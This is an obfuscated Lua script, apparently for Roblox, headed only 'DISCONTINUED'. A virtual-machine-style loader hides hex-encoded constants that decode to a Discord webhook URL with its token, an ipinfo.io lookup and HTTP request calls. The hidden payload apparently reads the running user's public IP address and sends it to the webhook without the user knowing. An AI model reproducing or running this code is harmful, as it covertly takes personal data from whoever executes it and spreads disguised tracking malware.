DISCONTINUED
local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v87=v2(v0(v30,16));if v19 then local v97=v5(v87,v19);v19=nil;return v97;else return v87;end end end);local function v20(v31,v32,v33)if v33 then local v88=(v31/(2^(v32-1)))%(2^(((v33-1) -(v32-1)) + 1)) ;return v88-(v88%1) ;else local v89=2^(v32-1) ;return (((v31%(v89 + v89))>=v89) and 1) or 0 ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + 2 );v18=v18 + 2 ;return (v36 * 256) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + 3 );v18=v18 + 4 ;return (v40 * 16777216) + (v39 * 65536) + (v38 * 256) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=1;local v44=(v20(v42,1,20) * (2^32)) + v41 ;local v45=v20(v42,21,31);local v46=((v20(v42,32)==1) and  -1) or 1 ;if (v45==0) then if (v44==0) then return v46 * 0 ;else v45=1;v43=0;end elseif (v45==2047) then return ((v44==0) and (v46 * (1/0))) or (v46 * NaN) ;end return v8(v46,v45-1023 ) * (v43 + (v44/(2^52))) ;end local function v25(v47)local v48;if  not v47 then v47=v23();if (v47==0) then return "";end end v48=v3(v16,v18,(v18 + v47) -1 );v18=v18 + v47 ;local v49={};for v63=1, #v48 do v49[v63]=v2(v1(v3(v48,v63,v63)));end return v6(v49);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v50={};local v51={};local v52={};local v53={v50,v51,nil,v52};local v54=v23();local v55={};for v65=1,v54 do local v66=v21();local v67;if (v66==1) then v67=v21()~=0 ;elseif (v66==2) then v67=v24();elseif (v66==3) then v67=v25();end v55[v65]=v67;end v53[3]=v21();for v69=1,v23() do local v70=v21();if (v20(v70,1,1)==0) then local v93=v20(v70,2,3);local v94=v20(v70,4,6);local v95={v22(),v22(),nil,nil};if (v93==0) then v95[3]=v22();v95[4]=v22();elseif (v93==1) then v95[3]=v23();elseif (v93==2) then v95[3]=v23() -(2^16) ;elseif (v93==3) then v95[3]=v23() -(2^16) ;v95[4]=v22();end if (v20(v94,1,1)==1) then v95[2]=v55[v95[2]];end if (v20(v94,2,2)==1) then v95[3]=v55[v95[3]];end if (v20(v94,3,3)==1) then v95[4]=v55[v95[4]];end v50[v69]=v95;end end for v71=1,v23() do v51[v71-1 ]=v28();end return v53;end local function v29(v57,v58,v59)local v60=v57[1];local v61=v57[2];local v62=v57[3];return function(...)local v73=v60;local v74=v61;local v75=v62;local v76=v27;local v77=1;local v78= -1;local v79={};local v80={...};local v81=v12("#",...) -1 ;local v82={};local v83={};for v90=0,v81 do if (v90>=v75) then v79[v90-v75 ]=v80[v90 + 1 ];else v83[v90]=v80[v90 + 1 ];end end local v84=(v81-v75) + 1 ;local v85;local v86;while true do v85=v73[v77];v86=v85[1];if (v86<=29) then if (v86<=14) then if (v86<=6) then if (v86<=2) then if (v86<=0) then local v114=v85[2];do return v13(v83,v114,v78);end elseif (v86>1) then local v118=v85[2];local v119,v120=v76(v83[v118](v13(v83,v118 + 1 ,v78)));v78=(v120 + v118) -1 ;local v121=0;for v231=v118,v78 do v121=v121 + 1 ;v83[v231]=v119[v121];end else v83[v85[2]][v83[v85[3]]]=v83[v85[4]];end elseif (v86<=4) then if (v86==3) then local v124=v85[2];v83[v124]=v83[v124](v13(v83,v124 + 1 ,v85[3]));else local v126=v85[2];v83[v126](v13(v83,v126 + 1 ,v78));end elseif (v86==5) then local v127=v85[2];local v128,v129=v76(v83[v127](v83[v127 + 1 ]));v78=(v129 + v127) -1 ;local v130=0;for v234=v127,v78 do v130=v130 + 1 ;v83[v234]=v128[v130];end else do return;end end elseif (v86<=10) then if (v86<=8) then if (v86==7) then if  not v83[v85[2]] then v77=v77 + 1 ;else v77=v85[3];end else v83[v85[2]]=v85[3] + v83[v85[4]] ;end elseif (v86>9) then local v132=v74[v85[3]];local v133;local v134={};v133=v10({},{__index=function(v237,v238)local v239=v134[v238];return v239[1][v239[2]];end,__newindex=function(v240,v241,v242)local v243=v134[v241];v243[1][v243[2]]=v242;end});for v245=1,v85[4] do v77=v77 + 1 ;local v246=v73[v77];if (v246[1]==14) then v134[v245-1 ]={v83,v246[3]};else v134[v245-1 ]={v58,v246[3]};end v82[ #v82 + 1 ]=v134;end v83[v85[2]]=v29(v132,v133,v59);else v83[v85[2]]=v83[v85[3]][v85[4]];end elseif (v86<=12) then if (v86==11) then local v138=v74[v85[3]];local v139;local v140={};v139=v10({},{__index=function(v248,v249)local v250=v140[v249];return v250[1][v250[2]];end,__newindex=function(v251,v252,v253)local v254=v140[v252];v254[1][v254[2]]=v253;end});for v256=1,v85[4] do v77=v77 + 1 ;local v257=v73[v77];if (v257[1]==14) then v140[v256-1 ]={v83,v257[3]};else v140[v256-1 ]={v58,v257[3]};end v82[ #v82 + 1 ]=v140;end v83[v85[2]]=v29(v138,v139,v59);else local v142=v85[2];local v143,v144=v76(v83[v142](v13(v83,v142 + 1 ,v78)));v78=(v144 + v142) -1 ;local v145=0;for v259=v142,v78 do v145=v145 + 1 ;v83[v259]=v143[v145];end end elseif (v86==13) then v83[v85[2]]=v85[3];else v83[v85[2]]=v83[v85[3]];end elseif (v86<=21) then if (v86<=17) then if (v86<=15) then if  not v83[v85[2]] then v77=v77 + 1 ;else v77=v85[3];end elseif (v86==16) then v83[v85[2]][v83[v85[3]]]=v85[4];else v83[v85[2]]=v83[v85[3]]%v85[4] ;end elseif (v86<=19) then if (v86>18) then local v154=v85[2];do return v13(v83,v154,v78);end else local v155=v85[2];v83[v155](v13(v83,v155 + 1 ,v78));end elseif (v86>20) then v83[v85[2]]=v83[v85[3]]%v83[v85[4]] ;else v83[v85[2]]={};end elseif (v86<=25) then if (v86<=23) then if (v86==22) then v83[v85[2]]=v59[v85[3]];else local v160=v85[2];v83[v160](v83[v160 + 1 ]);end elseif (v86==24) then v83[v85[2]]=v83[v85[3]]%v85[4] ;else v77=v85[3];end elseif (v86<=27) then if (v86==26) then local v163=v85[2];local v164,v165=v76(v83[v163](v83[v163 + 1 ]));v78=(v165 + v163) -1 ;local v166=0;for v262=v163,v78 do v166=v166 + 1 ;v83[v262]=v164[v166];end else v83[v85[2]]=v59[v85[3]];end elseif (v86==28) then local v169=v85[2];do return v83[v169](v13(v83,v169 + 1 ,v85[3]));end else v83[v85[2]]= #v83[v85[3]];end elseif (v86<=44) then if (v86<=36) then if (v86<=32) then if (v86<=30) then v83[v85[2]]=v83[v85[3]][v85[4]];elseif (v86==31) then local v171=v85[2];v83[v171]=v83[v171](v13(v83,v171 + 1 ,v78));else v83[v85[2]]=v85[3] + v83[v85[4]] ;end elseif (v86<=34) then if (v86>33) then local v174=v85[2];local v175=v83[v85[3]];v83[v174 + 1 ]=v175;v83[v174]=v175[v85[4]];else local v179=v85[2];local v180,v181=v76(v83[v179](v13(v83,v179 + 1 ,v85[3])));v78=(v181 + v179) -1 ;local v182=0;for v265=v179,v78 do v182=v182 + 1 ;v83[v265]=v180[v182];end end elseif (v86>35) then local v183=v85[2];v83[v183]=v83[v183](v13(v83,v183 + 1 ,v78));else local v185=v85[2];local v186,v187=v76(v83[v185](v13(v83,v185 + 1 ,v85[3])));v78=(v187 + v185) -1 ;local v188=0;for v268=v185,v78 do v188=v188 + 1 ;v83[v268]=v186[v188];end end elseif (v86<=40) then if (v86<=38) then if (v86==37) then local v189=v85[2];local v190=v83[v189];local v191=v83[v189 + 2 ];if (v191>0) then if (v190>v83[v189 + 1 ]) then v77=v85[3];else v83[v189 + 3 ]=v190;end elseif (v190<v83[v189 + 1 ]) then v77=v85[3];else v83[v189 + 3 ]=v190;end else v83[v85[2]]=v83[v85[3]] -v85[4] ;end elseif (v86==39) then v83[v85[2]]= #v83[v85[3]];else local v194=v85[2];local v195=v83[v194 + 2 ];local v196=v83[v194] + v195 ;v83[v194]=v196;if (v195>0) then if (v196<=v83[v194 + 1 ]) then v77=v85[3];v83[v194 + 3 ]=v196;end elseif (v196>=v83[v194 + 1 ]) then v77=v85[3];v83[v194 + 3 ]=v196;end end elseif (v86<=42) then if (v86>41) then v83[v85[2]]=v58[v85[3]];else v83[v85[2]]=v58[v85[3]];end elseif (v86>43) then v83[v85[2]]=v83[v85[3]] -v85[4] ;else v83[v85[2]]={};end elseif (v86<=51) then if (v86<=47) then if (v86<=45) then v83[v85[2]]=v83[v85[3]] + v85[4] ;elseif (v86>46) then local v204=v85[2];local v205=v83[v204];local v206=v83[v204 + 2 ];if (v206>0) then if (v205>v83[v204 + 1 ]) then v77=v85[3];else v83[v204 + 3 ]=v205;end elseif (v205<v83[v204 + 1 ]) then v77=v85[3];else v83[v204 + 3 ]=v205;end else local v207=v85[2];do return v83[v207](v13(v83,v207 + 1 ,v85[3]));end end elseif (v86<=49) then if (v86==48) then v83[v85[2]][v83[v85[3]]]=v85[4];else local v210=v85[2];local v211=v83[v85[3]];v83[v210 + 1 ]=v211;v83[v210]=v211[v85[4]];end elseif (v86==50) then v83[v85[2]]=v83[v85[3]]%v83[v85[4]] ;else do return;end end elseif (v86<=55) then if (v86<=53) then if (v86==52) then v77=v85[3];else v83[v85[2]]=v85[3];end elseif (v86>54) then v83[v85[2]]=v83[v85[3]] + v85[4] ;else v83[v85[2]]=v83[v85[3]];end elseif (v86<=57) then if (v86==56) then local v222=v85[2];v83[v222](v83[v222 + 1 ]);else v83[v85[2]][v83[v85[3]]]=v83[v85[4]];end elseif (v86>58) then local v225=v85[2];v83[v225]=v83[v225](v13(v83,v225 + 1 ,v85[3]));else local v227=v85[2];local v228=v83[v227 + 2 ];local v229=v83[v227] + v228 ;v83[v227]=v229;if (v228>0) then if (v229<=v83[v227 + 1 ]) then v77=v85[3];v83[v227 + 3 ]=v229;end elseif (v229>=v83[v227 + 1 ]) then v77=v85[3];v83[v227 + 3 ]=v229;end end v77=v77 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!223O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E73657274030C3O00682O74705F726571756573742O033O002BC3CF03083O007EB1A3BB4586DBA703793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O31353739343739322O36303631353231382F4A2D6D466669764C6A556A78686A6F783647625361677841614C6C5F524D43502O476F37514D6A7A63486F3270494C742O522D5655335F4D684B472O706A42545961764203063O00D126D922CAF803053O009C43AD4AA503043O00761B847D03073O002654D72976DC4603073O00D655172617EC4303053O009E30764272030C3O00F8A42A04337DB1B6BF3D003303073O009BCB44705613C503103O00612O706C69636174696F6E2F6A736F6E03043O00DA49D92F03083O009826BD569C20188503043O0067616D65030A3O0047657453657276696365030B3O006EE843B775F945B14FFF5203043O00269C37C7030A3O004A534F4E456E636F646503073O0040A773682D1D6003083O0023C81D1C4873149A03073O00482O747047657403143O00682O7470733A2O2F6970696E666F2E696F2F6970004B3O0012163O00013O00201E5O0002001216000100013O00201E000100010003001216000200013O00201E000200020004001216000300053O00060F0003000A000100010004193O000A0001001216000300063O00201E000400030007001216000500083O00201E000500050009001216000600083O00201E00060006000A00060B00073O000100062O000E3O00064O000E8O000E3O00044O000E3O00014O000E3O00024O000E3O00053O0012160008000B4O001400093O00042O0036000A00073O00120D000B000C3O00120D000C000D4O0003000A000C00020020100009000A000E2O0036000A00073O00120D000B000F3O00120D000C00104O0003000A000C00022O0036000B00073O00120D000C00113O00120D000D00124O0003000B000D00022O00010009000A000B2O0036000A00073O00120D000B00133O00120D000C00144O0003000A000C00022O0014000B3O00012O0036000C00073O00120D000D00153O00120D000E00164O0003000C000E0002002010000B000C00172O00010009000A000B2O0036000A00073O00120D000B00183O00120D000C00194O0003000A000C0002001216000B001A3O002022000B000B001B2O0036000D00073O00120D000E001C3O00120D000F001D4O0021000D000F4O0024000B3O0002002022000B000B001E2O0014000D3O00012O0036000E00073O00120D000F001F3O00120D001000204O0003000E00100002001216000F001A3O002022000F000F002100120D001100224O0003000F001100022O0001000D000E000F2O0003000B000D00022O00010009000A000B2O00380008000200012O00333O00013O00013O00023O00026O00F03F026O00704002284O001400025O00120D000300014O002700045O00120D000500013O00042F0003002300012O002900076O0036000800024O0029000900014O0029000A00024O0029000B00034O0029000C00044O0036000D6O0036000E00063O002037000F000600012O0021000C000F4O0024000B3O00022O0029000C00034O0029000D00044O0036000E00013O002026000F000600012O0027001000014O0032000F000F0010001020000F0001000F0020260010000600012O0027001100014O00320010001000110010200010000100100020370010001000012O0021000D00104O0002000C6O0024000A3O0002002018000A000A00022O001A0009000A4O001200073O00010004280003000500012O0029000300054O0036000400024O002E000300046O00036O00333O00017O00",v9(),...);
